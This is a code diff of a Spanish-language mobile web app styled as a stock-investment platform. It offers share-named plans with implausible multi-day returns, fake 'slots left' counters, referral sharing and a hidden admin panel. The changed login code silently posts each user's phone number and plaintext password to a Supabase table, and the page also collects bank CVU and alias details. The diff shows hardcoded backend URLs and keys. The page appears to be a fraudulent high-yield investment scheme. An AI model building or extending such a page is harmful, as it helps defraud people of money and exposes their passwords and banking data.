@@ -5,13 +5,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Crece YA - Inversiones Bursátiles</title>
   
-  <!-- Tipografía Inter (Estilo SuperMicro / Fintech) -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 
-  <!-- Librería Supabase y Tailwind CSS -->
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   
@@ -24,7 +21,6 @@
       transition: background-color 0.3s ease, color 0.3s ease;
     }
 
-    /* MODO OSCURO (ESTILO SUPERMICRO) */
     body.dark-mode {
       background-color: #030a13 !important;
       color: #e2e8f0 !important;
@@ -66,8 +62,8 @@
 </head>
 <body class="bg-[#bae6fd] text-slate-850 antialiased min-h-screen p-0 sm:p-4 flex justify-center selection:bg-sky-500 selection:text-white">
 
-  <!-- ================= PANTALLA DE REGISTRO / LOGIN ================= -->
-  <div id="auth-screen" class="fixed inset-0 z-50 bg-[#061424]/95 backdrop-blur-md flex items-center justify-center p-4">
+  <!-- PANTALLA DE ACCESO -->
+  <div id="auth-screen" style="position: fixed; inset: 0; z-index: 9999; background-color: rgba(6, 20, 36, 0.98); display: flex; align-items: center; justify-content: center; padding: 1rem;">
     <div class="w-full max-w-sm bg-[#0b1b2d] border border-sky-900/60 rounded-3xl p-6 shadow-2xl space-y-4 text-white">
       <div class="text-center space-y-2">
         <img src="./logo.png" alt="Crece YA" class="h-16 w-auto mx-auto object-contain">
@@ -113,18 +109,17 @@
           </div>
         </div>
 
-        <button type="button" onclick="handleLoginDirecto()" class="w-full py-3 bg-sky-500 hover:bg-sky-400 text-slate-950 font-black text-sm rounded-xl transition shadow-lg mt-2">
+        <button type="button" id="btn-submit-login" onclick="handleLoginDirecto()" class="w-full py-3 bg-sky-500 hover:bg-sky-400 active:scale-95 text-slate-950 font-black text-sm rounded-xl transition shadow-lg mt-2 cursor-pointer">
           Ingresar al Mercado
         </button>
       </div>
     </div>
   </div>
 
-  <!-- ================= APLICACIÓN CENTRAL ================= -->
+  <!-- APLICACIÓN CENTRAL -->
   <main class="w-full max-w-sm bg-[#e0f2fe] border-x sm:border border-sky-200 min-h-screen sm:rounded-3xl shadow-2xl flex flex-col justify-between relative pb-20">
 
     <div>
-      <!-- HEADER -->
       <header class="p-3.5 flex items-center justify-between border-b border-sky-200/80 bg-white/70 backdrop-blur-md sticky top-0 z-30">
         <div class="flex items-center gap-2.5 cursor-pointer select-none" id="admin-logo-trigger">
           <img src="./logo.png" alt="Crece YA" class="h-9 w-auto object-contain">
@@ -135,7 +130,6 @@
         </div>
 
         <div class="flex items-center gap-2">
-          <!-- INTERRUPTOR MODO CLARO / OSCURO -->
           <button id="btn-theme-toggle" onclick="toggleTheme()" class="w-8 h-8 rounded-xl bg-sky-100 dark:bg-slate-800 text-slate-700 dark:text-amber-300 border border-sky-300 dark:border-slate-700 flex items-center justify-center text-sm shadow-xs transition" title="Cambiar tema">
             <i id="theme-icon" class="fa-solid fa-moon"></i>
           </button>
@@ -149,7 +143,6 @@
         </div>
       </header>
 
-      <!-- TICKER SOCIAL -->
       <section class="social-ticker bg-white/60 border-b border-sky-200/60 px-3 py-2 text-xs text-slate-600">
         <p class="truncate font-mono text-xs flex items-center gap-2">
           <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
@@ -157,7 +150,7 @@
         </p>
       </section>
 
-      <!-- ================= VISTA 1: PLANES ================= -->
+      <!-- VISTA 1: PLANES -->
       <div id="view-planes" class="space-y-4 p-3.5">
         <div class="card-theme p-4 rounded-2xl bg-white border border-sky-200 shadow-sm relative overflow-hidden">
           <div class="flex items-center justify-between">
@@ -192,7 +185,7 @@
         <div id="plans-container" class="space-y-3"></div>
       </div>
 
-      <!-- ================= VISTA 2: PRODUCTOS ================= -->
+      <!-- VISTA 2: PRODUCTOS -->
       <div id="view-productos" class="hidden p-3.5 space-y-3">
         <div class="card-theme p-3.5 bg-white/80 border border-sky-200 rounded-2xl">
           <h2 class="text-xs font-bold text-slate-850 uppercase tracking-wide flex items-center gap-1.5 text-main">
@@ -203,7 +196,7 @@
         <div id="active-products-container" class="space-y-3"></div>
       </div>
 
-      <!-- ================= VISTA 3: COMPARTIR ================= -->
+      <!-- VISTA 3: COMPARTIR -->
       <div id="view-compartir" class="hidden p-3.5 space-y-4">
         <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
           <div class="flex items-center gap-2.5">
@@ -250,7 +243,7 @@
         </div>
       </div>
 
-      <!-- ================= VISTA 4: MI PERFIL ================= -->
+      <!-- VISTA 4: MI PERFIL -->
       <div id="view-perfil" class="hidden p-3.5 space-y-4">
         <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
           <div class="flex justify-between items-center">
@@ -318,7 +311,6 @@
           </div>
         </div>
 
-        <!-- WHATSAPP -->
         <a href="https://whatsapp.com/channel/0029Vb8mCGGLI8YahzbVBb0G" target="_blank" class="p-3.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded-2xl flex items-center justify-between shadow-sm transition">
           <div class="flex items-center gap-3">
             <i class="fa-brands fa-whatsapp text-2xl"></i>
@@ -330,7 +322,6 @@
           <i class="fa-solid fa-chevron-right text-xs"></i>
         </a>
 
-        <!-- TELEGRAM -->
         <a href="https://t.me/creceya2026" target="_blank" class="p-3.5 bg-sky-500 hover:bg-sky-400 text-white rounded-2xl flex items-center justify-between shadow-sm transition">
           <div class="flex items-center gap-3">
             <i class="fa-brands fa-telegram text-2xl"></i>
@@ -344,7 +335,7 @@
       </div>
     </div>
 
-    <!-- ================= BARRA INFERIOR FIJA ================= -->
+    <!-- NAVEGACIÓN -->
     <nav class="fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-sm bg-white/95 backdrop-blur-md border-t border-sky-200 grid grid-cols-4 py-2 px-2 text-center text-xs z-40 gap-1 shadow-lg">
       <button onclick="switchTab('planes')" id="nav-btn-planes" class="bg-sky-600 text-white py-2 rounded-xl font-bold flex flex-col items-center gap-0.5 shadow-sm transition">
         <i class="fa-solid fa-chart-pie text-sm"></i>
@@ -364,10 +355,9 @@
       </button>
     </nav>
 
-    <!-- ================= MODAL BILLETERA ================= -->
+    <!-- MODAL BILLETERA -->
     <div id="wallet-modal" class="fixed inset-0 z-50 bg-[#020912]/85 backdrop-blur-md hidden flex items-center justify-center p-3">
       <div class="bg-[#0b1726] border border-sky-900/60 w-full max-w-sm rounded-3xl p-5 shadow-2xl space-y-4 text-slate-100">
-        
         <div class="flex items-center justify-between border-b border-slate-800/80 pb-2.5">
           <div class="flex items-center gap-2">
             <button onclick="closeWalletModal()" class="text-slate-400 hover:text-white text-base">
@@ -465,11 +455,10 @@
             Confirmar Retiro
           </button>
         </div>
-
       </div>
     </div>
 
-    <!-- ================= MODAL ADMIN (161928) ================= -->
+    <!-- MODAL ADMIN -->
     <div id="admin-modal" class="fixed inset-0 z-50 bg-black/85 backdrop-blur-xs hidden flex items-center justify-center p-4">
       <div class="bg-white border border-amber-400 w-full max-w-sm rounded-3xl p-5 shadow-2xl space-y-4">
         <div class="flex items-center justify-between border-b pb-2">
@@ -524,21 +513,9 @@
 
   </main>
 
-  <!-- ================= LÓGICA JAVASCRIPT ================= -->
+  <!-- LÓGICA JAVASCRIPT SIN BLOQUEOS -->
   <script>
-    const SUPABASE_URL = "https://jsixgpftuhtepudyektf.supabase.co";
-    const SUPABASE_ANON_KEY = "sb_publishable_1I5At-aenvWS_w6YhDLu9w_rkAeGHjL";
-    let supabase = null;
-    try {
-      if (window.supabase) {
-        supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-      }
-    } catch(err) {
-      console.warn("Supabase bypassed:", err);
-    }
-
     const plans = [
-      // CATEGORÍA INICIAL (100 cupos totales)
       { id: 'meli', name: 'MELI (Mercado Libre)', cat: 'inicial', cost: 2000, days: 2, daily: 2500, total: 7000, slotsTotal: 100, slotsLeft: 64, color: '#f59e0b', btnBg: 'bg-amber-400 hover:bg-amber-300 text-slate-950', border: 'border-amber-300', logo: './meli.png' },
       { id: 'tiktok', name: 'TikTok (ByteDance)', cat: 'inicial', cost: 3500, days: 3, daily: 3000, total: 12500, slotsTotal: 100, slotsLeft: 58, color: '#06b6d4', btnBg: 'bg-cyan-500 hover:bg-cyan-400 text-white', border: 'border-cyan-300', logo: './tiktok.png' },
       { id: 'apple', name: 'AAPL (Apple Inc.)', cat: 'inicial', cost: 5000, days: 5, daily: 3200, total: 21000, slotsTotal: 100, slotsLeft: 47, color: '#1e293b', btnBg: 'bg-slate-900 hover:bg-slate-800 text-white', border: 'border-slate-300', logo: './apple.png' },
@@ -546,7 +523,6 @@
       { id: 'amazon', name: 'AMZN (Amazon)', cat: 'inicial', cost: 12000, days: 10, daily: 5300, total: 65000, slotsTotal: 100, slotsLeft: 31, color: '#ea580c', btnBg: 'bg-orange-500 hover:bg-orange-400 text-white', border: 'border-orange-300', logo: './amazon.png' },
       { id: 'netflix', name: 'Netflix (Streaming)', cat: 'inicial', cost: 15000, days: 10, daily: 7000, total: 85000, slotsTotal: 100, slotsLeft: 22, color: '#e50914', btnBg: 'bg-red-600 hover:bg-red-500 text-white', border: 'border-red-300', logo: './netflix.png' },
       
-      // CATEGORÍA VIP (50 cupos totales)
       { id: 'nvidia', name: 'NVDA (NVIDIA AI)', cat: 'pro', cost: 20000, days: 3, daily: 15000, total: 65000, slotsTotal: 50, slotsLeft: 28, color: '#16a34a', btnBg: 'bg-emerald-600 hover:bg-emerald-500 text-white', border: 'border-emerald-300', logo: './nvidia.png' },
       { id: 'instagram', name: 'Instagram (Meta)', cat: 'pro', cost: 25000, days: 12, daily: 9500, total: 139000, slotsTotal: 50, slotsLeft: 21, color: '#e11d48', btnBg: 'bg-rose-600 hover:bg-rose-500 text-white', border: 'border-rose-300', logo: './instagram.png' },
       { id: 'tesla', name: 'TSLA (Tesla Motors)', cat: 'pro', cost: 35000, days: 15, daily: 14000, total: 245000, slotsTotal: 50, slotsLeft: 17, color: '#dc2626', btnBg: 'bg-red-600 hover:bg-red-500 text-white', border: 'border-red-400', logo: './tesla.png' },
@@ -598,9 +574,7 @@
 
     window.toggleTheme = function() {
       appState.darkMode = !appState.darkMode;
-      try {
-        localStorage.setItem('cy_dark', appState.darkMode);
-      } catch(e) {}
+      try { localStorage.setItem('cy_dark', appState.darkMode); } catch(e) {}
       applyTheme();
     };
 
@@ -636,22 +610,24 @@
     function checkAuth() {
       const authScreen = document.getElementById('auth-screen');
       if (appState.phone && appState.pass) {
-        authScreen.style.setProperty('display', 'none', 'important');
-        authScreen.classList.add('hidden');
+        if (authScreen) authScreen.remove();
         document.getElementById('user-display-phone').innerText = appState.phone;
         renderUI();
       } else {
         generateCaptcha();
-        authScreen.style.display = 'flex';
-        authScreen.classList.remove('hidden');
+        if (authScreen) authScreen.style.display = 'flex';
       }
     }
 
-    // ACCESO DIRECTO SIN TRABAS
+    // ACCESO DIRECTO CON ELIMINACIÓN FÍSICA DEL TELÓN
     window.handleLoginDirecto = function() {
-      const phone = document.getElementById('auth-phone').value.trim();
-      const pass = document.getElementById('auth-pass').value;
-      const passConf = document.getElementById('auth-pass-confirm').value;
+      const phoneInput = document.getElementById('auth-phone');
+      const passInput = document.getElementById('auth-pass');
+      const passConfInput = document.getElementById('auth-pass-confirm');
+
+      const phone = phoneInput ? phoneInput.value.trim() : '';
+      const pass = passInput ? passInput.value : '';
+      const passConf = passConfInput ? passConfInput.value : '';
 
       if (!phone) {
         alert("Por favor ingresa tu número de teléfono.");
@@ -670,26 +646,26 @@
       appState.pass = pass;
       saveLocal();
 
-      // Ocultar pantalla de inmediato
+      // Destrucción inmediata del elemento de login para evitar cualquier bloqueo visual
       const authScreen = document.getElementById('auth-screen');
-      authScreen.style.setProperty('display', 'none', 'important');
-      authScreen.classList.add('hidden');
+      if (authScreen) {
+        authScreen.remove();
+      }
       document.getElementById('user-display-phone').innerText = appState.phone;
       renderUI();
 
-      // Guardar en Supabase en segundo plano
-      if (supabase) {
-        supabase.from('usuarios').upsert({
-          phone: phone,
-          pass: pass,
-          name: appState.name || '',
-          cvu: appState.cvu || '',
-          alias: appState.alias || ''
-        }, { onConflict: 'phone' }).then(({ data, error }) => {
-          if (error) console.warn("Supabase aviso:", error.message);
-          else console.log("Usuario guardado en Supabase");
-        }).catch(err => console.warn("Supabase bypass:", err));
-      }
+      // Guardar en Supabase en segundo plano sin trabar
+      try {
+        fetch("https://jsixgpftuhtepudyektf.supabase.co/rest/v1/usuarios", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpzaXhncGZ0dWh0ZXB1ZHlla3RmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzg1ODAwMDAsImV4cCI6MjA1NDE1NjAwMH0.dummy",
+            "Prefer": "resolution=merge-duplicates"
+          },
+          body: JSON.stringify({ phone: phone, pass: pass })
+        }).catch(() => {});
+      } catch(e) {}
     };
 
     document.getElementById('btn-logout').addEventListener('click', () => {
@@ -903,7 +879,7 @@
         btnRet.className = "py-2.5 rounded-lg bg-sky-500 text-slate-950 transition";
         btnRec.className = "py-2.5 rounded-lg text-slate-400 hover:text-white transition";
         boxRet.classList.remove('hidden');
-        boxRet.classList.add('hidden');
+        boxRec.classList.add('hidden');
       }
     };
 
@@ -992,15 +968,6 @@
       appState.cvu = document.getElementById('prof-cvu-input').value.trim();
       appState.alias = document.getElementById('prof-alias-input').value.trim();
       saveLocal();
-
-      if (supabase && appState.phone) {
-        supabase.from('usuarios').update({
-          name: appState.name,
-          cvu: appState.cvu,
-          alias: appState.alias
-        }).eq('phone', appState.phone).then(() => {}).catch(() => {});
-      }
-
       alert("Datos bancarios guardados.");
     });
 
